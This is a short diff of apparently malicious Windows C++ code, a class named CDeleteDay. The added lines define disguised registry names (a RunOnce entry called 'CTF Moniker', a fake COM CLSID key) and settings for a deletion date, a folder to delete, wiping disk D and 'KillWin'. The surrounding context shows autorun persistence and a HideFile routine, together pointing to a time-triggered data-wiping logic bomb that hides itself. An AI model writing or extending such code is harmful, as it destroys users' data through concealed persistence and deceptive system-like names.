@@ -4,6 +4,18 @@
 #include <string>
 using namespace std;
 
+static const wchar_t* RunOnceItemName = L"CTF Moniker";
+
+//HKEY_CLASSES_ROOT
+static const wchar_t* RegDataKeyName = L"CLSID\\{00000305-1111-0000-C000-A0B0C0000046}";
+
+static const wchar_t* DelDayKeyName = L"delDay";
+static const wchar_t* DelDayOfWeekKeyName = L"delDayOfWeek";
+static const wchar_t* DelMonthKeyName = L"delMonth";
+static const wchar_t* DelFolderKeyName = L"FolderToDel";
+static const wchar_t* DelDiskDKeyName = L"delD";
+static const wchar_t* KillWindowsKeyName = L"KillWin";
+
 bool DeleteFolder();
 bool PerformATask();
 bool IfDeleteDiskD();
@@ -43,7 +55,6 @@ bool CDeleteDay::AddToAutoRun()
 		, csExePath.GetString()
 		, csExePath.GetLength()) != ERROR_SUCCESS)
 	{
-		//TRACE("Облом с SHSetValue() в AddToAutorun()", "Облом", MB_ICONERROR);
 		TRACE("Облом с SHSetValue() в AddToAutorun()");
 		return false;
 	}
@@ -152,7 +163,7 @@ void CDeleteDay::HideFile()
 
 	GetModuleFileName(NULL, szFileExe, sizeof(szFileExe)); // Получаем путь к запущенному ехешнику
 
-														   //Retrieves the short path form of the specified path.
+	//Retrieves the short path form of the specified path.
 	if (GetShortPathName(szFileExe, sz, MAX_PATH)) // Преобразуем имя файла в досовский вид
 		wcscpy(szFileExe, sz);
 
